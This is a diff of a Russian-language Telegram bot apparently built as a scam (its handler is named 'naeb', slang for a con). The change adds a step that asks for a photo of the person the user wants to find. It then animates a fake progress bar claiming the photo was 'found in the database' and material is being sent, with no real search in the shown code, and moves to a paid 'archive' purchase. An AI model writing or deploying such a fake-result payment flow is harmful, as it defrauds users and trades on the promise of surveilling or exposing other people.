@@ -114,23 +114,37 @@ async def ask_for_link(update: Update, context: CallbackContext):
 
     return 0
 
-async def search(update:Update, context:CallbackContext):
+async def content(update: Update, context: CallbackContext):
+    if update.message:
+        message = update.message
+    else:
+        message = update.callback_query.message
+
+    await context.bot.send_message(
+        message.chat.id, 
+        '<b>🔗 Отправьте фотографию человека, которого вы хотите найти:</b>',
+        parse_mode="HTML"
+        )
+    
+    return 1
+
+async def search(update:Update, context: CallbackContext):
     startin_text = list("🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥")
     if update.message:
         message = update.message
     else:
         message = update.callback_query.message
-        
+ 
     msg = await context.bot.send_message(
         message.chat.id,
-        f"Выполянем поиск... 🔎\n\n✅ Страница найдена в базе\n\n⏳ Отправка материала... <b>{0}%</b>\n{''.join(startin_text)}",
+        f"Выполянем поиск... 🔎\n\n✅ Фотография найдена в базе\n\n⏳ Отправка материала... <b>{0}%</b>\n{''.join(startin_text)}",
         parse_mode="HTML"
     )
 
     for index in range(len(startin_text)):
         startin_text[index] = "🟩"
         await context.bot.edit_message_text(
-            f"Выполянем поиск... 🔎\n\n✅ Страница найдена в базе\n\n⏳ Отправка материала... <b>{(index + 1) * 10}%</b>\n{''.join(startin_text)}",
+            f"Выполянем поиск... 🔎\n\n✅ Фотография найдена в базе\n\n⏳ Отправка материала... <b>{(index + 1) * 10}%</b>\n{''.join(startin_text)}",
             message.chat.id,
             msg.id,
             parse_mode='HTML'
@@ -160,7 +174,7 @@ async def search(update:Update, context:CallbackContext):
         write_timeout=5,
     )
 
-    return 1
+    return 2
 
 async def confirm_paying(update: Update, context: CallbackContext):
     code = "#" + str(uuid.uuid4().hex)[:6].upper()
@@ -229,9 +243,11 @@ async def garbage(update:Update, context:CallbackContext):
     else:
         message = update.callback_query.message
     
+    logging.info(message)
+
     await context.bot.send_message(
         message.chat.id,
-        f"<b>{update.messsage.chat.username}</b>, я пока не умею обраьатывать такие запросы, поэтому воспользуйтесь меню.",
+        f"<b>{message.chat.username}</b>, я пока не умею обраьатывать такие запросы, поэтому воспользуйтесь меню.",
         parse_mode="HTML",
         reply_markup=InlineKeyboardMarkup([
             [InlineKeyboardButton(
@@ -253,8 +269,9 @@ def main() -> None:
     naeb_handler = ConversationHandler(
         entry_points=[CallbackQueryHandler(ask_for_link, "dump_naeb",)],
         states={
-            0:[CallbackQueryHandler(search, "search",)],
-            1:[CallbackQueryHandler(confirm_paying, "buy_archive",)],
+            0:[CallbackQueryHandler(content, "search",)],
+            1:[MessageHandler(filters.PHOTO, search)],
+            2:[CallbackQueryHandler(confirm_paying, "buy_archive",)],
         },
         fallbacks=[CallbackQueryHandler(start, "menu",)]
     )
@@ -262,7 +279,8 @@ def main() -> None:
     application.add_handler(CallbackQueryHandler(start, 'menu'))
     application.add_handler(CallbackQueryHandler(check_payment, "check_payment",))
     
-
+    
+    application.add_handler(MessageHandler(filters.TEXT, garbage))
     application.run_polling()
 
 
